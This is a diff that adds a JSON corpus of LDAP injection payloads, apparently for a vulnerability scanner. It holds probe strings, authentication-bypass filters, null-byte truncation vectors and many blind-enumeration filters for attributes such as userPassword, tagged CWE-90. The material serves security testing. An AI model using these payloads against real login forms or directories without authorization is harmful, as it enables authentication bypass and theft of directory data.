@@ -1,0 +1,1173 @@
+{
+  "version": "5.1.0",
+  "category": "ldap",
+  "payloads": [
+    {
+      "id": "ldapi.probe.paren",
+      "vector": "*)(uid=*",
+      "description": "Unbalanced filter probe — triggers an LDAP filter parse error.",
+      "context": "error_based",
+      "cwe": "CWE-90",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "expected_evidence": [
+        "javax.naming",
+        "LDAPException",
+        "Bad search filter"
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html"
+      ],
+      "tags": [
+        "probe"
+      ]
+    },
+    {
+      "id": "ldapi.authbypass.wildcard",
+      "vector": "*)(&",
+      "description": "Wildcard + always-true tautology for authentication bypass.",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "owasp": "A07:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "auth-bypass"
+      ]
+    },
+    {
+      "id": "ldapi.authbypass.admin_close",
+      "vector": "admin)(&))",
+      "description": "Close the filter right after a known user, dropping the password clause.",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "owasp": "A07:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "auth-bypass",
+        "login"
+      ]
+    },
+    {
+      "id": "ldapi.blind.objectclass_wildcard",
+      "vector": "*)(objectClass=*",
+      "description": "Enumerate all objects (blind boolean).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "enumeration"
+      ]
+    },
+    {
+      "id": "ldapi.blind.attr_wildcard",
+      "vector": "*))%00",
+      "description": "Null-byte truncation of the rest of the filter.",
+      "context": "filter_bypass",
+      "cwe": "CWE-90",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "waf_bypass": true,
+      "tags": [
+        "null-byte"
+      ]
+    },
+    {
+      "id": "ldap.legacy.0000871bab",
+      "vector": "admin)(&",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.025c9a0279",
+      "vector": "*)(&(uid=*)(userPassword=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.0af9a53de4",
+      "vector": "admin)(&(manager=*)(uid=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.0b8c9c0323",
+      "vector": "*)(employeeNumber=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.0c02a4cf9a",
+      "vector": "admin)(|(department=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.0f3da9bac2",
+      "vector": "admin*)(|(userPassword=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.11d2f80a33",
+      "vector": "admin)(&(cn=admin)(|(objectClass=*)))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.140b08dd7c",
+      "vector": "*)(&(objectCategory=person))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.15239849c5",
+      "vector": "admin)(|(&(uid=*)))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.15fd7b5367",
+      "vector": "*)(gidNumber=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.16adad937c",
+      "vector": "*)(uid=*)(userPassword=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.18625bd8ab",
+      "vector": "*)(description=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.18cd23e877",
+      "vector": "*)(&(objectClass=user)(|(sAMAccountName=*)))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.1c31dcd8d5",
+      "vector": "admin)(|(objectClass=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.22dcec7f40",
+      "vector": "admin)(|(userAccountControl=512))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.2d6010ceda",
+      "vector": "*)(&(objectClass=organizationalPerson))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.2dd30a1e67",
+      "vector": "admin))(|(cn=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.33b6f924cd",
+      "vector": "admin)(|(memberOf=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.3549253fee",
+      "vector": "admin)(|(homeDirectory=/root))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.3a39d94025",
+      "vector": "*)(displayName=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.3a5626ae76",
+      "vector": "*)(cn=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.3b58e174b2",
+      "vector": "*)(&(objectClass=shadowAccount))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.3ea0836eea",
+      "vector": "admin)(|(uidNumber=0))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.3fcb612b52",
+      "vector": "*)(&(uid=*)(|(cn=*)))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.4168358b38",
+      "vector": "*)(userAccountControl=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.427f8262b2",
+      "vector": "admin)(|(ou=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.4386ca8949",
+      "vector": "*)(&(objectClass=posixAccount))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.44997f12c4",
+      "vector": "admin)(&(uid=admin)(|(userPassword=*)))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.45a3f91be4",
+      "vector": "*)(sn=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.493b62004f",
+      "vector": "*)(sAMAccountName=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.4e5f47b970",
+      "vector": "*)(|(&(objectClass=*)))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.50f037d4d8",
+      "vector": "admin)(&(uid=admin)(userPassword=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.5220840755",
+      "vector": "admin)(|(uid=admin))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.5289711ba9",
+      "vector": "*()(|",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.52d7f0ec7b",
+      "vector": "admin)(&(gidNumber=0)(uid=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.567059f2e3",
+      "vector": "*)(title=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.59f26ed6f9",
+      "vector": "*)(&(|(objectClass=*)))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.5fa65e84a9",
+      "vector": "*)(distinguishedName=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.6121625dae",
+      "vector": "*)(telephoneNumber=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.6150ca7c7e",
+      "vector": "*)(loginShell=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.64e6208e04",
+      "vector": "*)(|(&",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.684e402715",
+      "vector": "*)(objectClass=user)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.6cdf4bad62",
+      "vector": "*))(|(objectClass=*)",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.6da50eb3e3",
+      "vector": "*)(userPassword=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.6f3748bb4d",
+      "vector": "admin)(&(objectClass=user))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.709bb6af25",
+      "vector": "*)(pwdLastSet=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.78b6b21de8",
+      "vector": "admin)(|(sAMAccountName=admin))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.806875947d",
+      "vector": "admin)(|(employeeNumber=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.842c0c60c6",
+      "vector": "admin))(&(objectClass=*)",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.853e69278f",
+      "vector": "*)(&(objectClass=inetOrgPerson))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.8782c99284",
+      "vector": "admin))(|(objectClass=*)",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.88ecf32de0",
+      "vector": "*)(homeDirectory=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.8b41da521b",
+      "vector": "admin)(&(uid=admin)(objectClass=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.8bb427f187",
+      "vector": "admin)(&(loginShell=/bin/bash)(uid=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.8d05fb3042",
+      "vector": "admin)(|(uid=*)(|(cn=*)))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.92230879a7",
+      "vector": "admin)(!(&(uid=*)))",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.9736fa1cd9",
+      "vector": "*)(manager=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.973efc52ec",
+      "vector": "*)(uidNumber=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.9926ecb312",
+      "vector": "*)(department=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.9d3e902d1d",
+      "vector": "*)(memberOf=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.9fcf1dcfe2",
+      "vector": "admin)(&(uid=admin)(|(cn=*)))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.a120033fe4",
+      "vector": "*()|&'",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.a17945bdb1",
+      "vector": "admin))(|(|",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.a29cf3f4f2",
+      "vector": "admin)(|(displayName=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.a75390fcce",
+      "vector": "admin)(|(cn=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.a7cb321b9c",
+      "vector": "admin)(!(&(objectClass=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.a7e003d7cf",
+      "vector": "*)(|(userPassword=*)(cn=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.a8831314b1",
+      "vector": "admin)(&(objectClass=user)(sAMAccountName=admin))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.a9be4d9432",
+      "vector": "*)(&(|(uid=*)(mail=*)))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.ab8ab04e4d",
+      "vector": "admin)(&(title=*)(ou=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.aeb2e0d7fe",
+      "vector": "*)(mail=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.b35631765a",
+      "vector": "*)(|(uid=*)(userPassword=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.b72cd8a83e",
+      "vector": "*)(|(uid=*)(cn=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.b75356746d",
+      "vector": "*)(|(objectClass=*)",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.b811eb0b31",
+      "vector": "*)(uid=*))(|(uid=*",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.ceab54db38",
+      "vector": "admin*",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.cf66229920",
+      "vector": "*))(&",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.d49a577e9f",
+      "vector": "*)((|",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.d76c2c0f94",
+      "vector": "admin)(&(objectClass=person)(uid=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.dc0e5c1b94",
+      "vector": "admin)(|(mail=*@*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.df1500ebb0",
+      "vector": "admin)(|(password=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.df58248c41",
+      "vector": "*",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.e2603e4a2b",
+      "vector": "*)(&(objectCategory=person)(sAMAccountName=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.e47cc5fc6d",
+      "vector": "*)(objectClass=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.e8d6c9c805",
+      "vector": "*)(&(objectClass=*)(uid=*)",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.e9d09024e1",
+      "vector": "*)(objectClass=person)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.ea52b9b40d",
+      "vector": "*()|%26",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.eb38552fc1",
+      "vector": "admin)(|(givenName=*)(sn=*))",
+      "description": "Imported from the legacy corpus (auth_bypass).",
+      "context": "auth_bypass",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.f4332d4421",
+      "vector": "*()|(*",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.f7796d35fd",
+      "vector": "*)(givenName=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
+      "cwe": "CWE-90",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ldap.legacy.ffc719640c",
+      "vector": "*)(ou=*)",
+      "description": "Imported from the legacy corpus (boolean_blind).",
+      "context": "boolean_blind",
